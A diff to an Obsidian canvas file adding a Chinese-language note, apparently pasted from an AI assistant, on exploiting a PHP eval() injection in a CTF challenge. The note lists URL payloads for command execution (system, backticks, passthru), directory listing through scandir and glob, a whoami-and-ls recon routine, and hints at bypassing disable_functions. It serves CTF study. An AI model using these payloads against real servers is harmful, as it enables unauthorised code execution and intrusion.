@@ -7,7 +7,8 @@
 		{"id":"56c02fa0c7fa80cc","x":-554,"y":1240,"width":845,"height":320,"type":"file","file":"Attachments/Pasted image 20260323171003.png"},
 		{"id":"2f0092383331758b","x":-880,"y":1740,"width":885,"height":255,"type":"file","file":"Attachments/Pasted image 20260323172404.png"},
 		{"id":"dfc28e9352e7cfb9","x":-1545,"y":2160,"width":1481,"height":320,"type":"file","file":"Attachments/Pasted image 20260323172505.png"},
-		{"id":"004fde645ece2ca5","x":-1545,"y":2680,"width":1286,"height":237,"type":"file","file":"Attachments/Pasted image 20260323172539.png"}
+		{"id":"004fde645ece2ca5","x":-1545,"y":2680,"width":1286,"height":237,"type":"file","file":"Attachments/Pasted image 20260323172539.png"},
+		{"id":"d37fe4444ffb4f7c","x":-400,"y":3093,"width":1140,"height":1867,"type":"text","text":"在 PHP 的 `eval()` 中直接输入 `ls` 是**不生效**的。\n\n作为 CS 本科生，你需要理清一个核心逻辑：`eval()` 是 **PHP 代码执行**函数，而 `ls` 是 **Linux 系统命令**。你不能直接在代码里写一个系统命令，就像你不能在 C 语言的 `main` 函数里直接写一行 `ls;` 一样。\n\n要在 `eval()` 里执行 `ls`，你需要通过 PHP 提供的“系统调用”函数作为桥梁。\n\n---\n\n### 1. 最常用的三种输入方式\n\n假设你的漏洞点是 `eval($_GET['cmd']);`，你应该这样构造 URL 参数：\n\n#### A. 使用 `system()` (最推荐，自带输出)\n`system()` 会执行命令并将结果**直接打印**到网页上。\n* **Payload:** `?cmd=system('ls');`\n* **原理：** PHP 调用 shell 执行 `ls`，然后把结果抓回来显示。\n\n#### B. 使用反引号 (内联执行)\n在 PHP 中，反引号 `` ` `` 是 `shell_exec()` 的简写。\n* **Payload:** `?cmd=echo `ls`;`\n* **注意：** 反引号只负责执行并返回结果，不会自动打印。所以你必须在前面加个 `echo` 才能在浏览器看到内容。\n\n#### C. 使用 `passthru()` (处理二进制/原始数据)\n如果你想看完整的权限信息（`ls -al`），这个函数非常稳。\n* **Payload:** `?cmd=passthru('ls');`\n\n---\n\n### 2. 进阶：如何看到“隐藏”文件？\n\n在 CTF 中，Flag 经常被命名为 `.flag` 或者放在根目录。单纯的 `ls` 可能看不全。\n\n* **看所有文件（包括隐藏文件）：**\n    `?cmd=system('ls -a');`\n* **看根目录：**\n    `?cmd=system('ls /');`\n* **递归查看所有子目录：**\n    `?cmd=system('ls -R');`\n\n---\n\n### 3. 如果 `system` 被禁用了怎么办？ (Disable Functions)\n\n很多 CTF 题目会修改 `php.ini` 里的 `disable_functions`，把 `system`, `passthru`, `shell_exec` 全关了。这时候你可以尝试这些“漏网之鱼”：\n\n* **`scandir()` (纯 PHP 方式，不依赖系统命令)：**\n    `?cmd=print_r(scandir('.'));`\n    * *原理：* 这是一个 PHP 内置函数，用于列出目录里的文件，不经过 shell，所以通常不会被禁。\n* **`glob()`：**\n    `?cmd=print_r(glob('/*'));` （查看根目录下的所有文件）\n\n\n\n---\n\n### 4. 一个 C/S 程序员的严谨习惯：分号\n\n在 `eval()` 中，你输入的字符串会被当作一行 PHP 代码执行。\n**切记：** PHP 语句必须以 **分号 `;`** 结尾。\n\n* **错误：** `eval(\"system('ls')\")` -> 可能会报语法错误。\n* **正确：** `eval(\"system('ls');\")` -> 完美的闭环。\n\n### 💡 总结：CTF 里的 RCE 第一步\n\n当你发现一个 `eval` 漏洞时，你的标准动作流程应该是：\n1.  `system('whoami');` （确认权限，看是不是 `www-data`）\n2.  `system('ls');` （看当前目录）\n3.  `system('ls /');` （看根目录，找 flag 文件）\n\n**你现在是发现 `system` 被题目禁用了吗？如果 `print_r(scandir('.'));` 也没法用，那可能涉及更高级的绕过（比如利用 `LD_PRELOAD` 或者 FFI）。要我帮你查一下该环境禁用了哪些函数吗？**"}
 	],
 	"edges":[
 		{"id":"b3f001ed764b980b","fromNode":"46e49d42d78fa68d","fromSide":"bottom","toNode":"c0b2892180955fba","toSide":"left","label":"直接看源码逻辑"},
@@ -16,6 +17,7 @@
 		{"id":"9773b9dccf8348b7","fromNode":"178d83941aa1ef06","fromSide":"bottom","toNode":"56c02fa0c7fa80cc","toSide":"top"},
 		{"id":"16025de7379b89af","fromNode":"56c02fa0c7fa80cc","fromSide":"bottom","toNode":"2f0092383331758b","toSide":"top"},
 		{"id":"ae6b8c7528ef0bf9","fromNode":"2f0092383331758b","fromSide":"bottom","toNode":"dfc28e9352e7cfb9","toSide":"top"},
-		{"id":"5aaaf6fdb8fe326e","fromNode":"dfc28e9352e7cfb9","fromSide":"bottom","toNode":"004fde645ece2ca5","toSide":"top"}
+		{"id":"5aaaf6fdb8fe326e","fromNode":"dfc28e9352e7cfb9","fromSide":"bottom","toNode":"004fde645ece2ca5","toSide":"top"},
+		{"id":"b8cde3732ab97a3f","fromNode":"004fde645ece2ca5","fromSide":"right","toNode":"d37fe4444ffb4f7c","toSide":"top"}
 	]
 }
